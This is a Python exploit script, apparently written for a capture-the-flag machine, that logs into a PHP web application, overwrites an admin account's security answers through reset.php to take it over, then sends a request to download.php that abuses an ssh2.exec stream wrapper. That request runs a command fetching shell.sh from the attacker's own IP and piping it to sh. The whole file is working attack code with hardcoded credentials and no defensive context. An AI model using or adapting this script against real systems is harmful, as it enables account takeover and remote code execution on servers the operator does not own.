#!/usr/bin/env python3
import requests
import sys

def get_cookie(url: str, user: str, passwd: str) -> str | None:
    data: str = "submitted=true&username={}&password={}".format(user, passwd)
    headers: dict = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        r1 = requests.post(url + "/login.php", data=data, headers=headers, allow_redirects=False)
        cookie: str = r1.cookies.get("PHPSESSID")
        print("Cookie:", cookie)
    except requests.exceptions.RequestException as e:
        print("Error", e)
        return None
    return cookie

def sub_main(url: str, admin_user: str, cookie: str, a1="hi", a2="hi", a3="hi") -> bool:
    data: str = "username={0}&new_answer1={1}&new_answer2={2}&new_answer3={3}".format(admin_user, a1, a2, a3)
    headers: dict = {"Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "PHPSESSID={}".format(cookie)}
    try:
        r1 = requests.post(url + "/reset.php", data=data, headers=headers)
        if r1.status_code == 200:
            print("*Reseted questions for:", admin_user)
            new_data: str = data.replace("new_", "")
            r2 = requests.post(url + "/security_login.php", data=new_data, headers=headers)
            print("*Logged in with reseted questions")
    except requests.exceptions.RequestException as e:
        print("Error", e)
        return False
    return True

def main(url: str, fid: int, ip_addr: str, cookie: str) -> bool:
    payload: str = "id={}&show=true&format=ssh2.exec://eric:america@127.0.0.1/curl+-s+http://{}:8000/shell.sh|sh%23".format(fid, ip_addr)
    headers: dict = {"Cookie": "PHPSESSID={}".format(cookie)}
    try:
        print("Starting persistance...")
        r = requests.get(url + "/download.php?" + payload, headers=headers)
    except requests.exceptions.RequestException as e:
        print("Error", e)
        return False
    return True

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage:", sys.argv[0], "<url> <username:password> <your_ip> <file_id>")
        sys.exit(1)

    url: str = sys.argv[1]
    user, passwd = sys.argv[2].split(":")
    ip_addr: str = sys.argv[3]
    fid: int = sys.argv[4]

    admin_user: str = "admin_ef01cab31aa"
    cookie: str = get_cookie(url, user, passwd)
    if sub_main(url, admin_user, cookie):
        main(url, fid, ip_addr, cookie)
